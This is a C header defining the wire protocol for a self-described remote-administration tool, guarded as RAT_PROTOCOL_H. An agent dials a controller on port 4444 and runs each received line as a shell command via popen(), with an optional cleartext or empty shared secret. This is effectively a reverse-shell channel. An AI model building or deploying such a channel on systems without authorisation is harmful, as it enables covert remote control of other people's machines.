/* protocol.h
 * Shared constants and wire-format helpers for the remote-administration
 * channel used by agent.c and controller.c. Keeping them in one place means
 * both sides of the channel always agree on framing, limits, and verbs.
 *
 * WIRE PROTOCOL (V1)
 * ------------------
 * Transport: TCP. All frames are ASCII; the session payload is text.
 *
 * 1. Handshake (the controller speaks first):
 *      controller -> agent : "V1 " + "\n"        (4-byte banner)
 *      agent -> controller : "<key>\n"           (shared secret)
 *      controller -> agent : "OK\n" | "DENIED\n"
 *    An empty key means "no authentication" and is only recommended for
 *    loopback testing. The secret travels in clear text, so keep the channel
 *    on a trusted network or tunnel it (VPN, ssh -L).
 *
 * 2. Commands (controller -> agent), one LF-terminated line each:
 *      "<shell command>\n"   executed with popen() on the managed host
 *      "exit\n"              agent shuts down and closes the session
 *      "\n"                  ignored (keepalive)
 *
 * 3. Responses (agent -> controller), length-prefixed frames:
 *      "<8 zero-padded decimal byte count><payload>"
 *    A zero-length frame is sent when a command produces no output, so the
 *    controller never blocks waiting for data that will not arrive.
 *
 * Limits: a handshake line is at most LINE_MAX_LEN-1 bytes; a response
 * payload is truncated to PROTO_MAX_FRAME bytes before being sent.
 */
#ifndef RAT_PROTOCOL_H
#define RAT_PROTOCOL_H

#include <stddef.h>

#include "net.h"

/* Protocol banner sent by the controller before the key exchange. */
#define PROTO_BANNER "V1 \n"
#define PROTO_REPLY_OK "OK"
#define PROTO_REPLY_DENIED "DENIED"

/* Default TCP port. Override at build time with:
 *      make CFLAGS="-Wall -O2 -DDEFAULT_PORT=9001"
 * or at run time (controller: -p/--port, agent: positional <port>). */
#ifndef DEFAULT_PORT
#define DEFAULT_PORT 4444
#endif

/* Default controller address the agent dials when no host is given.
 * Override at build time with:
 *      make CFLAGS='-Wall -O2 -DDEFAULT_HOST="\"203.0.113.10\""'
 */
#ifndef DEFAULT_HOST
#define DEFAULT_HOST "127.0.0.1"
#endif

/* Size of the fixed buffers used for one command / one response. */
#ifndef BUF_SIZE
#define BUF_SIZE 4096
#endif

/* Maximum accepted frame payload (must fit in the 8-digit header). */
#ifndef PROTO_MAX_FRAME
#define PROTO_MAX_FRAME (BUF_SIZE - 1)
#endif

/* Maximum length of a handshake line (banner, key, reply). */
#ifndef LINE_MAX_LEN
#define LINE_MAX_LEN 256
#endif

/* Maximum length of the shared secret (see AGENT_KEY / CONTROLLER_KEY). */
#ifndef MAX_KEY_LEN
#define MAX_KEY_LEN 128
#endif

/* Control words understood by both peers. */
#define CMD_EXIT "exit"

/* Framing helpers implemented once in protocol.c and linked into both
 * programs. proto_read_line() returns 0 on success, 1 when the line had to be
 * truncated to fit the buffer, and -1 on EOF/error. proto_recv_frame() returns
 * the number of payload bytes stored (NUL terminated), -1 on EOF/error, or -2
 * when the peer sent a malformed or oversized frame (the caller must drop the
 * connection because the stream can no longer be resynchronised). */
void proto_trim(char *s);
int proto_read_line(int sock, char *out, size_t outsz);
int proto_write_line(int sock, const char *line);
int proto_send_frame(int sock, const char *data, size_t len);
long proto_recv_frame(int sock, char *buf, size_t bufsz);

#endif /* RAT_PROTOCOL_H */